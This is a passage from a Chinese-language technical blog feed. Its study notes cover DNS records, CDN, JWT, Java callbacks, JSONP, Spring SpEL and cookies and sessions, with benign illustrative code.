Exchange）</td><td>指定邮件服务器，用于电子邮件交换</td><td>将example.com的邮件交给mail.example.com处理</td></tr><tr><td>TXT记录</td><td>用于存储任意文本信息，通常用于验证域名所有权、SPF（Sender Policy Framework）记录等</td><td>用于存储SPF记录，以指定允许发送电子邮件的服务器</td></tr><tr><td>NS记录（Name Server）</td><td>指定域名服务器，用于指示哪些服务器负责解析特定域名的查询请求</td><td>指定ns1.example.com和ns2.example.com作为example.com域名的域名服务器</td></tr><tr><td>PTR记录（Pointer Record）</td><td>用于反向DNS查找，将IP地址解析为域名</td><td>将IP地址192.0.2.1解析为example.com</td></tr><tr><td>SRV记录（Service）</td><td>指定提供特定服务的主机和端口号</td><td>指定_sip._tcp.example.com服务在sipserver.example.com主机上的5060端口</td></tr><tr><td>SOA记录（Start of Authority）</td><td>指定DNS区域的起始权威信息，包括域名的主要名称服务器、负责域名的邮箱地址等</td><td>定义example.com域名的主要名称服务器和域名管理员的电子邮箱地址</td></tr><tr><td>DNSKEY记录</td><td>用于存储域名的公钥，用于DNSSEC数字签名</td><td>存储example.com域名的公钥，用于验证DNSSEC签名</td></tr></tbody></table><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><p>CDN是通过将内容存储在全球各地的分布式服务器上，并利用智能路由技术将用户请求路由到最近的服务器，从而提高内容传输速度和用户体验的网络基础设施。</p><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><ol><li><strong>内容缓存和复制</strong>：CDN提供商会将网站的静态内容（如图像、样式表、脚本文件等）复制到其分布在全球各地的服务器节点上。这些节点通常位于因特网主要交换点（Internet Exchange Point）附近，覆盖了全球各个地理区域。</li><li><strong>请求路由</strong>：当用户访问网站时，DNS查询会被CDN服务提供商解析，返回距离用户最近的服务器节点的IP地址。</li><li><strong>内容交付</strong>：用户的请求会被路由到距离最近的CDN服务器节点，该节点会提供所需的内容。由于内容存储在距离用户更近的位置，因此传输时间更短，用户能够更快地加载网页和其他内容。</li></ol><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li><strong>加速内容传输</strong>：通过将内容存储在全球多个位置，CDN减少了内容的传输距离，从而提高了内容的加载速度。</li><li><strong>减轻源服务器负载</strong>：由于CDN节点负责提供大部分内容，源服务器的负载得以减轻，提高了源服务器的可用性和性能。</li><li><strong>提高抗DDoS能力</strong>：CDN具有分布式架构，可以帮助抵御分布式拒绝服务（DDoS）攻击，因为它可以分散流量并在较大范围内分散攻击影响。</li><li><strong>增强安全性</strong>：CDN提供商通常提供安全功能，如SSL加密、防火墙等，以保护内容和用户数据的安全性。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;h1 id=&quot;SDLC&quot;&gt;&lt;a href=&quot;#SDLC&quot; class=&quot;headerlink&quot; title=&quot;SDLC&quot;&gt;&lt;/a&gt;SDLC&lt;/h1&gt;&lt;p&gt;SDLC代表软件开发生命周期（Software Development Life  Cycle）。它是一种用于设计</summary>
      
    
    
    
    <category term="其他" scheme="https://erickinyae.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="基础" scheme="https://erickinyae.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL</title>
    <link href="https://erickinyae.github.io/2023/11/29/CodeQL/"/>
    <id>https://erickinyae.github.io/2023/11/29/CodeQL/</id>
    <published>2023-11-29T09:19:39.000Z</published>
    <updated>2023-12-30T15:54:57.753Z</updated>
    
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="代码审计" scheme="https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>身份验证</title>
    <link href="https://erickinyae.github.io/2023/11/23/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/"/>
    <id>https://erickinyae.github.io/2023/11/23/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/</id>
    <published>2023-11-23T07:42:58.000Z</published>
    <updated>2024-03-06T10:08:26.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>JWT（JSON Web Token）是一种用于在网络上安全地将声明传输的开放标准（RFC 7519）。它通常用于在身份验证和信息交换方面进行跨域通信。JWT 是一个紧凑的、自包含的方式，它可以在不同系统之间安全地传递信息。JWT 使用 JSON 对象进行编码，这使得它易于理解和处理。</p><p>JWT 由三部分组成：</p><ol><li><strong>Header（头部）：</strong> 包含了两部分信息，类型（typ）和使用的签名算法（alg）。通常，这部分会被 Base64 编码。</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>Payload（负载）：</strong> 包含声明（claims）。声明是关于实体（通常是用户）和其他数据的声明。有三种类型的声明：注册声明，公共声明，和私有声明。通常，这部分也会被 Base64 编码。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>Signature（签名）：</strong> 将前两部分编码后的字符串通过指定的算法进行签名。签名用于验证消息在传递过程中是否被篡改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>JWT 的主要优势包括：</p><ul><li><strong>轻量且紧凑：</strong> JWT 是一种轻量级的令牌格式，适用于在网络上传输信息。</li><li><strong>自包含：</strong> 由于包含了头部和负载，JWT 是一个自包含的令牌，不需要像传统的 Session 一样在服务器端保存状态。</li><li><strong>可扩展：</strong> 负载中的声明可以自由扩展，以满足各种应用场景的需求。</li><li><strong>跨语言支持：</strong> JWT 可以在不同的编程语言中轻松解析和生成，使其成为跨语言通信的良好选择。</li></ul><p>JWT 主要用于身份验证（Authentication）和授权（Authorization）场景，特别是在分布式系统和前后端分离的应用中广泛使用。</p><h2 id="应用举例"><a href="#应用举例" class="headerlink" title="应用举例"></a>应用举例</h2><p><strong>用户登录：</strong></p><ul><li>用户提供用户名和密码进行登录。</li><li>服务器验证用户的凭据，并生成一个 JWT 作为响应。</li></ul><p><strong>JWT 的生成过程：</strong></p><ul><li>Header 部分：</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>Payload 部分：</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;john_doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>Signature 部分：</strong> 使用服务器端的密钥对前两部分进行签名。</p><p><strong>生成的 JWT：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMTIzNDU2Nzg5MCIsICJ1c2VybmFtZSI6ICJqb2huX2RvZSIsICJyb2xlIjogInVzZXIiLCAiaWF0IjogMTYxNzYwMjE4NCwiZXhwIjogMTYxNzYwMjM2NH0.NQSmS9BoD8OCMqkdSb0nLd6YBZnd7zLcXtFjIaAOt1k</span><br></pre></td></tr></table></figure><p><strong>JWT 的传递：</strong></p><ul><li>客户端将 JWT 存储在本地，通常是在浏览器的 Local Storage 或 Session Storage 中。</li><li>每次客户端向服务器发送请求时，都将 JWT 放在请求头中（通常是 <code>Authorization</code> 头）。</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMTIzNDU2Nzg5MCIsICJ1c2VybmFtZSI6ICJqb2huX2RvZSIsICJyb2xlIjogInVzZXIiLCAiaWF0IjogMTYxNzYwMjE4NCwiZXhwIjogMTYxNzYwMjM2NH0.NQSmS9BoD8OCMqkdSb0nLd6YBZnd7zLcXtFjIaAOt1k</span><br></pre></td></tr></table></figure><p><strong>服务器端验证和解析 JWT：</strong></p><ul><li>服务器在接收到请求时，从请求头中获取 JWT。</li><li>服务器使用自己的密钥验证 JWT 的签名，确保它是有效的且未被篡改。</li><li>如果验证通过，服务器解析 JWT，提取其中的用户信息（例如用户ID、用户名、角色等）。</li></ul><p>这种方式使得在分布式系统中进行身份验证变得简单，因为服务器无需在会话中保持用户的登录状态，而是可以通过验证 JWT 来获取用户信息。这也使得不同服务之间更容易实现无状态的身份验证。需要注意的是，JWT 中包含的信息是可以被客户端解码的，因此不应该将敏感信息直接存放在 JWT 中，或者至少需要采用适当的加密手段。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JWT&quot;&gt;&lt;a href=&quot;#JWT&quot; class=&quot;headerlink&quot; title=&quot;JWT&quot;&gt;&lt;/a&gt;JWT&lt;/h1&gt;&lt;p&gt;JWT（JSON Web Token）是一种用于在网络上安全地将声明传输的开放标准（RFC 7519）。它通常用于在身份验证和信息交</summary>
      
    
    
    
    <category term="网络" scheme="https://erickinyae.github.io/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="鉴权" scheme="https://erickinyae.github.io/tags/%E9%89%B4%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>java</title>
    <link href="https://erickinyae.github.io/2023/11/23/java/"/>
    <id>https://erickinyae.github.io/2023/11/23/java/</id>
    <published>2023-11-23T03:33:00.000Z</published>
    <updated>2024-03-06T09:55:43.033Z</updated>
    
    <content type="html"><![CDATA[<ul><li></li></ul><h1 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h1><p>回调函数（Callback Function）是一种作为参数传递给其他函数的函数。回调函数允许一个函数在另一个函数执行完毕或在特定事件发生时被调用。</p><blockquote><p>从事件驱动的角度理解。</p></blockquote><p>在Java中，回调函数通常通过<strong>接口或匿名类</strong>的方式实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义回调接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Callback</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">onComplete</span><span class="params">(String result)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟异步操作的类</span></span><br><span class="line"><span class="comment">// AsyncOperation 类模拟了一个异步操作，它接受一个回调接口 Callback 作为参数。在异步操作完成后，通过调用回调函数的 onComplete 方法来通知调用者。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AsyncOperation</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">startAsyncOperation</span><span class="params">(Callback callback)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟异步操作</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 模拟耗时操作</span></span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 异步操作完成后调用回调函数</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;Async operation result&quot;</span>;</span><br><span class="line">            callback.onComplete(result);</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在 CallbackExample 类的 main 方法中，我们创建了一个 AsyncOperation 对象，并通过传递匿名类的方式实现了回调函数。当异步操作完成时，回调函数会被调用，并输出相应的结果。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CallbackExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">AsyncOperation</span> <span class="variable">asyncOperation</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AsyncOperation</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启动异步操作，并传递回调函数</span></span><br><span class="line">        asyncOperation.startAsyncOperation(<span class="keyword">new</span> <span class="title class_">Callback</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onComplete</span><span class="params">(String result)</span> &#123;</span><br><span class="line">                <span class="comment">// 异步操作完成后的处理逻辑</span></span><br><span class="line">                System.out.println(<span class="string">&quot;Callback received: &quot;</span> + result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 主线程继续执行其他操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Main thread continues to execute...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这种方式允许在异步操作完成后执行特定的逻辑，使得程序在等待异步结果的同时可以继续执行其他操作。</span></span><br></pre></td></tr></table></figure><h1 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h1><p>JSONP（JSON with Padding）是一种用于解决浏览器跨域请求的技术。由于同源策略的限制，浏览器通常阻止页面发起跨域请求。JSONP通过动态创建 <code>&lt;script&gt;</code> 标签的方式来绕过这一限制，从而实现跨域数据传输。</p><p>浏览器同源策略就是，A⽹站只能访问A⽹站数据，B⽹站只能访问B⽹站数据，AB不能互相访问数据。JSONP（JSON with Padding）是一种用于解决浏览器跨域请求的技术。由于同源策略的限制，浏览器通常阻止页面发起跨域请求。JSONP通过动态创建 <code>&lt;script&gt;</code> 标签的方式来绕过这一限制，从而实现跨域数据传输。</p><blockquote><p>理解：注意，这里的跨域是指，当前访问a域名（a.domain.com）加载得到的前端页面，在a域名的前端页面中访问b域名（b.domain.com）的数据，故称之为跨域。</p></blockquote><h2 id="JSONP工作原理："><a href="#JSONP工作原理：" class="headerlink" title="JSONP工作原理："></a>JSONP工作原理：</h2><ol><li><p>客户端（浏览器）在页面中动态创建一个 <code>&lt;script&gt;</code> 标签，并设置其 <code>src</code> 属性指向包含 JSON 数据的资源，同时通过查询字符串或路径参数将回调函数名传递给服务器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 回调函数</span></span><br><span class="line">function <span class="title function_">handleData</span><span class="params">(data)</span> &#123;</span><br><span class="line">    console.log(<span class="string">&quot;Received data:&quot;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// script代码，在其中指明需要由a域名访问到的b域名资源地址</span></span><br><span class="line"><span class="type">var</span> <span class="variable">script</span> <span class="operator">=</span> document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">script.src = <span class="string">&quot;https://example-api.com/data?callback=handleData&quot;</span>;</span><br><span class="line">document.body.appendChild(script);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>服务器根据接收到的回调函数名，将 JSON 数据包装在该回调函数中，返回给客户端。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">fetchDataFromDatabase</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 从数据库获取数据的示例</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//得到回调函数名称</span></span><br><span class="line"><span class="type">var</span> <span class="variable">callbackName</span> <span class="operator">=</span> req.query.callback;</span><br><span class="line"><span class="comment">//获得所需的json数据</span></span><br><span class="line"><span class="type">var</span> <span class="variable">jsonData</span> <span class="operator">=</span> fetchDataFromDatabase();</span><br><span class="line"><span class="comment">//返回json格式的数据，其中包含一段可执行的函数（脚本）</span></span><br><span class="line">res.send(callbackName + <span class="string">&#x27;(&#x27;</span> + JSON.stringify(jsonData) + <span class="string">&#x27;)&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>浏览器加载由服务器返回的脚本，并执行其中的 JavaScript 代码。这个脚本包含了客户端定义的回调函数，以及在这个回调函数中调用的实际数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handleData(&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;)</span><br></pre></td></tr></table></figure></li></ol><h1 id="SPEL"><a href="#SPEL" class="headerlink" title="SPEL"></a>SPEL</h1><p>SpEL（Spring Expression Language）是Spring框架中的一种表达式语言，它提供了在运行时对对象图进行查询和操作的强大的表达式语言。SpEL主要用于处理Spring框架中的配置文件，如XML和注解中的属性值，以及在运行时进行动态计算和处理。</p><p>以下是SpEL的一些主要特性和用法：</p><p><strong>表达式语法</strong>： SpEL提供了一种简单且强大的表达式语法，类似于其他主流的表达式语言，例如XPath、JavaScript等。它支持各种操作符、方法调用、属性访问等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;#&#123;T(java.lang.Math).random() * 100.0&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">double</span> randomValue;</span><br></pre></td></tr></table></figure><p><strong>在注解中的应用：</strong> SpEL经常在Spring注解中使用，例如<code>@Value</code>、<code>@Conditional</code>等。通过在注解中使用SpEL表达式，可以在运行时动态计算属性值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;#&#123;systemProperties[&#x27;java.home&#x27;]&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String javaHome;</span><br></pre></td></tr></table></figure><p><strong>访问对象属性和方法：</strong> SpEL允许访问对象的属性和方法。可以通过点号<code>.</code>来访问属性，通过括号<code>[]</code>来访问列表或映射中的元素。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;#&#123;user.name&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String userName;</span><br></pre></td></tr></table></figure><p><strong>条件表达式：</strong> SpEL支持条件表达式，类似于Java中的三元运算符。这允许在表达式中执行条件判断。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;#&#123;age &gt; 18 ? &#x27;Adult&#x27; : &#x27;Minor&#x27;&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String ageGroup;</span><br></pre></td></tr></table></figure><p><strong>集合投影和选择：</strong> SpEL支持对集合进行投影和选择操作。可以通过<code>!</code>操作符进行集合选择，通过<code>?</code>操作符进行集合投影。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;#&#123;&#x27;Spring&#x27; + &#x27; &#x27; + &#x27;Framework&#x27;&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String frameworkName;</span><br></pre></td></tr></table></figure><p><strong>类型引用和构造器引用：</strong> SpEL支持对类型进行引用，可以通过<code>T()</code>关键字引用Java类型。还支持构造器引用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;#&#123;T(java.util.UUID).randomUUID()&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String uuid;</span><br></pre></td></tr></table></figure><p>SpEL广泛用于Spring框架中的配置文件、注解处理、条件判断等场景，它提供了一种灵活的方式来处理动态值和运行时计算。在使用SpEL时，应注意避免执行具有潜在安全风险的表达式，特别是在从用户输入中构建表达式时。</p><h1 id="Cookie与Session"><a href="#Cookie与Session" class="headerlink" title="Cookie与Session"></a>Cookie与Session</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><blockquote><p>Cookie不能跨域，固不能用在前后端分离项目中。</p></blockquote><p><strong>什么是 Cookie？</strong></p><p>Cookie 是一种存储在用户计算机上的小型文本文件，由 Web 服务器生成，发送给浏览器，然后由浏览器保存。每当用户在同一网站再次访问时，浏览器会将该 Cookie 发送回服务器，以提供对用户信息的识别和跟踪。Cookie 主要用于记录用户的身份信息、用户的偏好设置、购物车内容等。</p><p><strong>Cookie 的实现原理：</strong></p><ol><li><strong>服务器生成 Cookie：</strong> 当用户首次访问一个网站时，服务器可以通过在响应头中设置 <code>Set-Cookie</code> 字段来生成一个或多个 Cookie。该字段包含 Cookie 的名称、值和一些属性（如过期时间、路径、域）。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: name=value; expires=Sat, 01 Jan 2022 00:00:00 GMT; path=/; domain=.example.com; HttpOnly; Secure</span><br></pre></td></tr></table></figure><p><strong>浏览器保存 Cookie：</strong> 浏览器在收到带有 <code>Set-Cookie</code> 头的响应后，会将 Cookie 保存在用户本地的 Cookie 存储中。</p><p><strong>浏览器发送 Cookie：</strong> 在用户的每次请求中，浏览器都会将与请求匹配的 Cookie 发送给服务器。这是通过在请求头中添加 <code>Cookie</code> 字段来实现的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: name=value</span><br></pre></td></tr></table></figure><p><strong>服务器读取 Cookie：</strong> 服务器通过读取请求头中的 <code>Cookie</code> 字段来获取用户发送的 Cookie。服务器可以使用这些 Cookie 识别用户、维护会话状态或执行其他逻辑。</p><p><strong>Cookie 的生命周期：</strong> Cookie 可以是会话 Cookie（仅在浏览器会话期间有效）或持久性 Cookie（在过期日期之前一直有效）。过期时间是通过 <code>expires</code> 或 <code>max-age</code> 属性设置的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: name=value; expires=Sat, 01 Jan 2022 00:00:00 GMT</span><br></pre></td></tr></table></figure><p>总体而言，Cookie 是一种简单而有效的机制，用于在客户端和服务器之间跟踪和维护状态。然而，由于其本地存储的特性，安全性问题和隐私问题也需要注意。因此，对于一些敏感信息，建议使用安全性更高的方法，如使用 HTTPS、将信息存储在服务器端等。</p><h3 id="java代码实现过程"><a href="#java代码实现过程" class="headerlink" title="java代码实现过程"></a>java代码实现过程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//S→C: 首次收到请求，生成cookie返回给客户端</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/c1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">cookie1</span><span class="params">(HttpServletResponse response)</span>&#123;</span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;login_username&quot;</span>, <span class="string">&quot;erickin&quot;</span>);</span><br><span class="line">    response.addCookie(cookie);</span><br><span class="line">    log.info(<span class="string">&quot;cookie已生成并返回, cookie_key:&#123;&#125;, cookie_value:&#123;&#125;&quot;</span>, cookie.getName(), cookie.getValue());</span><br><span class="line">    <span class="keyword">return</span> Result.success();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//C→S: 其后的每个请求中将携带该cookie；</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/c2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">cookie2</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">    Cookie[] cookies = request.getCookies();</span><br><span class="line">    <span class="keyword">for</span>(Cookie cookie : cookies)&#123;</span><br><span class="line">        <span class="keyword">if</span>(cookie.getName().equals(<span class="string">&quot;login_username&quot;</span>))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;服务端cookie已捕获, cookie_key:&#123;&#125;, cookie_value:&#123;&#125;&quot;</span>, cookie.getName(), cookie.getValue());</span><br><span class="line">            System.out.println(<span class="string">&quot;login_username:&quot;</span> + cookie.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Result.success();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>Session 是一种在客户端和服务器之间保存状态的机制，用于跟踪用户的会话信息。Session  的主要目的是在用户与服务器之间建立一种持久性的状态，以便服务器能够识别用户并在用户访问不同页面或执行不同操作时保持状态。与 Cookie  不同，Session 数据存储在服务器上而不是在客户端。</p><p><strong>Session 的实现原理：</strong></p><ol><li><strong>会话标识符（Session ID）：</strong> 当用户首次访问一个网站时，服务器会为其分配一个唯一的 Session ID，通常是一个长随机字符串。这个 Session ID 通过 Cookie 或 URL 